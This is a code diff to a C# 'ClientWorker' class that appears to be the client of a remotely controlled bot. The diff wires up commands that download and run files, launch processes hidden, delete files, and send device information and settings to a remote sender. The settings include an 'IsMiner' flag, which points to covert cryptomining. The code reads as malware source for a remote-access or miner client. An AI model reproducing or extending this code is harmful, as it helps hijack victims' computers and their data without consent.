@@ -27,12 +27,14 @@ namespace ClientWorker
 
         public List<string> GetInfoDevice()
         {
-            throw new NotImplementedException();
+            InfoDevice.AskedInfoDevice();
+            return InfoDevice.GetAllSettings();
         }
 
         public void DownloadFloader(string ftpPath, string localPath)
         {
-            throw new NotImplementedException();
+            FileManager.DownloadFloader(ftpPath, localPath);
+            Log.Send("DownloadFloader()");
         }
 
         public void DownloadUpdate()
@@ -43,79 +45,25 @@ namespace ClientWorker
 
         public void RunProgram(string file)
         {
-            throw new NotImplementedException();
+            FileManager.RunHideProc(file);
+        }
+        public void DownloadAndRun(string file)
+        {
+            FileManager.DownloadFileAndRun(file);
         }
 
-        public void Start()
+        public void Reconnect()
         {
-
+            Program.netSender.ReConnect();
         }
 
-        public void Analysis(string answer)
+        public void DeleteFile(string file)
         {
-            string head = answer.Split('_')[0];
-            List<string> parametrs = new List<string>();
-            parametrs.AddRange(answer.Split('_'));
-            parametrs.Remove(head);
-
-            switch (head)
-            {
-                case "GetInfoDevice":
-                   SendInfoDevice();
-                    Log.Send("SendInfoDevice()");
-                    break;
-
-                case "DownloadAndRun":
-                    foreach (string prm in parametrs)
-                    {
-                       FileManager.DownloadFileAndRun(prm);
-                    }
-                    Log.Send("DownloadAndRun()");
-                    break;
-
-                case "DownloadFloader":                   
-                    FileManager.DownloadFloader(parametrs[0], parametrs[1]);                 
-                    Service.Properties.Settings.Default.IsMiner = true;
-                    Service.Properties.Settings.Default.Save();
-                    Log.Send("DownloadFloader()");
-                    break;
-
-                case "RunProgram":
-                    foreach (string prm in parametrs)
-                    {
-                        FileManager.RunHideProc(prm);
-                    }
-                    Log.Send("RunProgram()");
-                    break;
-
-                case "GetSettings":
-                    SendSetting();
-                    Log.Send("SendSetting()");
-                    break;
-
-                case "GetLogList":
-                    SendLogList();
-                    Log.Send("SendLogList()");
-                    break;
-
-                case "DeleteFile":
-                    foreach (string prm in parametrs)
-                    {
-                        FileManager.DeleteFile(prm);
-                    }
-                    Log.Send("DeleteFiles()");
-                    break;
-
-                case "Reconnect":
-                //case "":
-                    Reconnect();
-                    Log.Send("Reconnect()");
-                    break;
-
-                default:
-                    Log.Send("UnknownCommand" + answer);
-                    break;
-            }
+            FileManager.DeleteFile(file);
+        }
+        public void GetSetting()
+        {
+            SendSetting();
         }
 
         public void GetUpd()
@@ -153,51 +101,19 @@ namespace ClientWorker
                 Log.Send("Не удалось удалить Updater: "+ex.Message);
             }
         }
-        public void Reconnect()
-        {
-            //Log.Send("Reconnect()");
-            //try
-            //{
-            //    Program.netSender.Close();
-            //    Program.netSenderThread.Abort();
-            //}
-            //catch
-            //{
-
-            //}
-
-            //Program.netSenderThread = new Thread(new ThreadStart(Program.netSender.Start));
-            //Program.netSenderThread.Start();
-        }
 
         private void SendSetting()
         {
-            //string message = "StartSetting" + StartData.delimiter+ Service.Properties.Settings.Default.Comp_name + StartData.delimiter +
-            //    Service.Properties.Settings.Default.IsMiner + StartData.delimiter +
-            //    Service.Properties.Settings.Default.Open_sum + StartData.delimiter +
-            //    Service.Properties.Settings.Default.Start_time + StartData.delimiter +
-            //    Service.Properties.Settings.Default.Key + StartData.delimiter +
-            //    Service.Properties.Settings.Default.Version + StartData.delimiter + "EndSetting";
+            string message = "StartSetting" + StartData.delimiter + Service.Properties.Settings.Default.Comp_name + StartData.delimiter +
+                Service.Properties.Settings.Default.IsMiner + StartData.delimiter +
+                Service.Properties.Settings.Default.Open_sum + StartData.delimiter +
+                Service.Properties.Settings.Default.Start_time + StartData.delimiter +
+                Service.Properties.Settings.Default.Key + StartData.delimiter +
+                Service.Properties.Settings.Default.Version + StartData.delimiter + "EndSetting";
 
-            //Program.netSender.SendMessage(message);
+            Program.netSender.SendMessage(message);
         }
 
-        private void SendInfoDevice()
-        {
-            //InfoDevice.AskedInfoDevice();
-
-            //string message = "StartInfoDevice" + StartData.delimiter;
-
-            //List<string> messages = new List<string>();
-            //messages.AddRange(InfoDevice.GetAllSettings());
-            //foreach (string s in messages)
-            //{
-            //    message += s + StartData.delimiter;
-            //}
-            //message += "EndInfoDevice";
-
-            //Program.netSender.SendMessage(message);
-        }
         private List<string> SendLogList()
         {
             List<string> message = new List<string>();
